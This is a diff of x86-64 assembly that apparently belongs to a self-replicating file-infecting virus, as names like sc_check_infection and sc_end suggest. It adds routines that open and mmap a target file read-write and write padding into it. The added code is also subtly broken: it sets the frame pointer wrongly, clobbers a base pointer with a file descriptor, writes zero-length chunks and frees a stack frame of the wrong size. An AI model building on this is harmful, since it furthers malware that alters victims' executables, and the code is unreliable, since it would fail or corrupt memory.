@@ -1,5 +1,5 @@
 				extern			sc_get_full_path
-				extern			sc_map_file
+				extern			sc_get_fd_size
 				extern			sc_check_infection
 				extern			sc_str_n_cmp
 				extern			sc_write_pad
@@ -457,6 +457,103 @@ sc_write_mem:
  .end:
  				add				rsp,					80
  				mov				rsp,					rbp	
+				pop				rbp
+				ret
+sc_map_file:
+				push			rbp
+				mov				rbp,					rbp
+				sub				rsp,					8;	src
+
+				mov				rsi,					2
+				mov				rax,					2
+				syscall
+
+				cmp				rax,					0
+				jl				.error
+
+				mov				qword[rsp],				rax
+				mov				rdi,					qword[rsp]
+				call			sc_get_fd_size
+
+				cmp				rax,					0
+				jl				.err_close
+
+				mov				r8,						qword[sc_glob]
+				mov				qword[r8+0x18],			rax
+				cmp				qword[r8+0x18],			64
+				jb				.err_close
+
+				mov				rdi,					0
+				mov				rsi,					qword[r8+0x18]
+				mov				rdx,					3
+				mov				rcx,					2
+				mov				r8,						qword[rsp]
+				mov				r9,						0
+				mov				rax,					9
+				syscall
+
+				mov				qword[r8+0xc60],		rax
+				cmp				qword[r8+0xc60],		0
+				je				.err_close
+
+				mov				rdi,					qword[rsp]
+				mov				rax,					3
+				syscall
+
+				mov				rax,					0
+				jmp				.end
+ .err_close:
+				mov				rdi,					qword[rsp]
+				mov				rax,					3
+				syscall
+ .error:
+ 				mov				rax,					-1
+ .end:
+ 				add				rsp,					8
+				mov				rsp,					rbp
+				pop				rbp
+				ret
+sc_write_pad:
+				push			rbp
+				mov				rbp,					rsp
+				sub				rsp,					16	;	+0x0	fd
+															;	+0x8	write_sz
+															;	+0x10	size
+				mov				qword[rsp],				rdi
+				mov				qword[rsp+0x8],			0
+				mov				qword[rsp+0x10],		rsi
+ .loop:
+ 				cmp				qword[rsp+0x10],		0
+				je				.success
+
+				cmp				qword[rsp+0x10],		0x400
+				jb				.write
+
+				mov				qword[rsp+0x10],		0x400
+ .write:
+ 				mov				r8,						qword[sc_glob]
+ 				mov				rsi,					qword[r8+0x460]
+				mov				rdx,					qword[rsp+0x8]
+				mov				rax,					1
+				syscall
+
+				cmp				rax,					0
+				jl				.error
+
+				cmp				rax,					qword[rsp+0x8]
+				jne				.error
+ .end_loop:
+ 				mov				r8,						qword[rsp+0x8]
+ 				sub				qword[rsp+0x10],		r8
+				jmp				.loop
+ .error:
+ 				mov				rax,					-1
+				jmp				.end
+ .success:
+ 				xor				rax,					rax
+ .end:
+				add				rsp,					8
+				mov				rsp,					rbp
 				pop				rbp
 				ret
 sc_end:
